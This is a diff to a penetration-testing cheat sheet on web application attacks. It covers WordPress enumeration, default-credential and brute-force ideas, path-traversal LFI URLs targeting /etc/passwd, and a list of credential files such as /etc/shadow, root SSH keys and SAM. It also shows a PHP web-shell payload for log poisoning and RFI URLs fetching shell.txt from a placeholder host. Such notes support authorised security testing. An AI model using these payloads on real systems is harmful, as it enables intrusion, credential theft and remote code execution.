@@ -46,7 +46,7 @@ Other Tools:
     Joomscan
     Feroxbuster	
 	
-## Web app specific  
+# Web app specific  
     
 Jenkins: [pwn jenkins](https://github.com/Scr1ptK1ddie/pwn_jenkins)  
 
@@ -62,20 +62,22 @@ Wordpress: wpscan
     wpscan --url <domain> --enumerate u (Usernames)
     wpscan --url <domain> --enumerate v 
 
-## Login pages   
+# Login pages   
 	
 	Default creds - admin: admin, admin:password, service specific default creds   
 	Register a new user  
 	Brute force log in  
 	SQL injection  
 
-## File Upload Pages  
+# File Upload Pages  
 
-### Local File Include       
-Check for client side scripts 
+## Local File Include       
 [Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
 [Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
 [PayloadAllTheThings FI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)  
+
+### Testing 
+Check for client side scripts 
 
     http://example.com/index.php?page=../../../etc/passwd  
     http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 
@@ -87,13 +89,44 @@ Check for client side scripts
 	/etc/passwd, etc.
 	can you include a remote file?
 	?test=php://filter/convert.base64-encode/resource=/filepath      -> base64 encode /decode  
+	
+### Interesting Files 
+Linux 
+
+    /etc/passwd
+    /etc/shadow
+    /etc/issue
+    /etc/group
+    /etc/hostname
+    /etc/ssh/ssh_config
+    /etc/ssh/sshd_config
+    /root/.ssh/id_rsa
+    /root/.ssh/authorized_keys
+    /home/user/.ssh/authorized_keys
+    /home/user/.ssh/id_rsa
+
+Windows 
+
+    /boot.ini
+    /autoexec.bat
+    /windows/system32/drivers/etc/hosts
+    /windows/repair/SAM
+
 Log Poisoning 
 	open: /log/apache2/access.log 
 	send payload as user agent string: <?php system($_GET['cmd']); ?>    
-	/log/apache2/access.log&cmd=id    
-
+	/log/apache2/access.log&cmd=id  
 	
-### SQL Injection 
+## Remote File Inclusion 
+Turning LFI to RFI: https://l.avala.mp/?p=241
+### Testing 
+
+    http://example.com/index.php?page=http://callback.com/shell.txt
+    http://example.com/index.php?page=http://callback.com/shell.txt%00
+    http://example.com/index.php?page=http:%252f%252fcallback.com%252fshell.txt
+	
+	
+## SQL Injection 
 [SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) 
 [Pentestmonkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)  
 Enum using nmap
